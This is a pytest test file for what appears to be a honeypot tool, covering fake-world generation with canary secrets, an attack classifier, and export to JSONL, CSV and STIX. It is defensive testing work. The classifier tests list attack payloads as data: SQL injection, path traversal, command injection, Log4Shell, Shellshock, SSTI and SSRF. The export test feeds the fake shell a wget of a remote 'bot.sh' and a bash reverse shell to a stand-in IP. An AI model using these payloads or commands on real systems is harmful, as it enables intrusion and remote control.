"""World generation, classifier and export."""

from __future__ import annotations

import csv
import io
import json

import pytest

from mirage_trap.core.classifier import classify, summarize
from mirage_trap.core.export import export_to_string, parse_since
from mirage_trap.core.world import PROFILE_STACKS, generate_world, load_world, save_world
from tests.conftest import client


def _strip_time(d: dict) -> dict:
    d = json.loads(json.dumps(d))
    d.pop("created")
    d["host"].pop("boot_time")
    d["host"].pop("installed")
    for e in d["employees"]:
        e.pop("created_at"), e.pop("last_login")
    for x in d["customers"]:
        x.pop("created_at")
    for o in d["orders"]:
        o.pop("created_at")
    return d


@pytest.mark.parametrize("profile", sorted(PROFILE_STACKS))
def test_world_is_deterministic_per_seed(profile):
    a, b = generate_world(profile, 42, "corp.test"), generate_world(profile, 42, "corp.test")
    assert _strip_time(a) == _strip_time(b)
    assert _strip_time(a) != _strip_time(generate_world(profile, 43, "corp.test"))


def test_world_contents_are_coherent(tmp_path):
    p = tmp_path / "w.json"
    save_world(generate_world("nginx-php-legacy", 7, "corp.test"), p)
    w = load_world(p)
    sec = w.data["secrets"]
    assert all(e["email"].endswith("@corp.test") for e in w.data["employees"])
    assert sec["aws_access_key_id"].startswith("AKIA") and len(sec["aws_access_key_id"]) == 20
    assert sec["db_password"] in w.vfs["/var/www/html/.env"].content
    passwd = w.vfs["/etc/passwd"].content
    for e in w.data["employees"]:
        if e["shell_access"]:
            assert f"{e['username']}:x:" in passwd
    tokens = {t for t, _, _ in w.canaries()}
    assert sec["db_password"] in tokens and sec["stripe_key"] in tokens
    user, pw = w.data["ssh_accept"][0]
    assert w.system_password_ok(user, pw)
    assert not w.system_password_ok(user, pw + "x")


def test_random_seed_when_zero():
    a, b = generate_world("nginx-php-legacy", 0), generate_world("nginx-php-legacy", 0)
    assert a["seed"] != b["seed"]


def test_unknown_profile():
    with pytest.raises(ValueError):
        generate_world("iis-classic", 1)


# -- classifier ---------------------------------------------------------------------------------

@pytest.mark.parametrize("path,query,body,ua,expected", [
    ("/p.php", "id=1%20UNION%20SELECT%201,2", "", "", "sqli"),
    ("/p.php", "id=1%27%20AND%20SLEEP(5)--", "", "", "sqli"),
    ("/x", "f=../../../../etc/passwd", "", "", "lfi"),
    ("/x", "f=php://filter/convert.base64-encode/resource=index.php", "", "", "lfi"),
    ("/ping", "", "host=1.1.1.1;cat%20/etc/passwd", "", "rce"),
    ("/", "", "", "${jndi:ldap://203.0.113.1/a}", "log4shell"),
    ("/cgi-bin/test.cgi", "", "", "() { :; }; /bin/bash -c id", "rce"),
    ("/search", "q={{7*7}}", "", "", "ssti"),
    ("/fetch", "url=http://169.254.169.254/latest/meta-data/", "", "", "ssrf"),
    ("/.env", "", "", "", "recon"),
    ("/", "", "", "python-requests/2.31.0", None),
    ("/", "", "", "Mozilla/5.0 (Windows NT 10.0) Chrome/120.0", None),
])
def test_classifier(path, query, body, ua, expected):
    found = classify("GET", path, query, body, {"user-agent": ua})
    assert summarize(found)[0] == expected


# -- export -------------------------------------------------------------------------------------

def test_parse_since():
    assert parse_since("") == 0
    assert parse_since("1h", now=10_000) == 6400
    assert parse_since("2d", now=1_000_000) == 1_000_000 - 172800
    assert parse_since("2024-01-01T00:00:00") == 1704067200
    with pytest.raises(ValueError):
        parse_since("yesterday")


async def test_export_formats(make_trap):
    c = make_trap()
    async with client(c, ip="203.0.113.50") as http:
        await http.get("/product.php", params={"id": "1 UNION SELECT 1,2,3,4"})
        await http.get("/.env")
    s, _ = c.deceiver.sessions.resolve("203.0.113.50", "ssh")
    sh = c.deceiver.shell(s, user="root", interactive=True, cwd="/root", protocol="ssh")
    await sh.run("wget http://198.51.100.200/bot.sh")
    await sh.run("bash -i >& /dev/tcp/198.51.100.201/4444 0>&1")
    c.telemetry.flush()

    lines = export_to_string(c.db, "jsonl").strip().splitlines()
    assert len(lines) == 2
    first = json.loads(lines[0])
    assert first["ip"] == "203.0.113.50" and first["attack_type"] == "sqli" and first["time"].endswith("Z")

    rows = list(csv.DictReader(io.StringIO(export_to_string(c.db, "csv"))))
    assert [r["path"] for r in rows] == ["/product.php", "/.env"]
    assert rows[0]["query"] == "id=1+UNION+SELECT+1%2C2%2C3%2C4"

    bundle = json.loads(export_to_string(c.db, "stix"))
    assert bundle["type"] == "bundle"
    patterns = [o["pattern"] for o in bundle["objects"] if o["type"] == "indicator"]
    assert "[ipv4-addr:value = '203.0.113.50']" in patterns
    assert "[url:value = 'http://198.51.100.200/bot.sh']" in patterns
    assert any("198.51.100.201" in p and "dst_port = 4444" in p for p in patterns)
    assert any(o["type"] == "sighting" for o in bundle["objects"])
    with pytest.raises(ValueError):
        export_to_string(c.db, "xml")
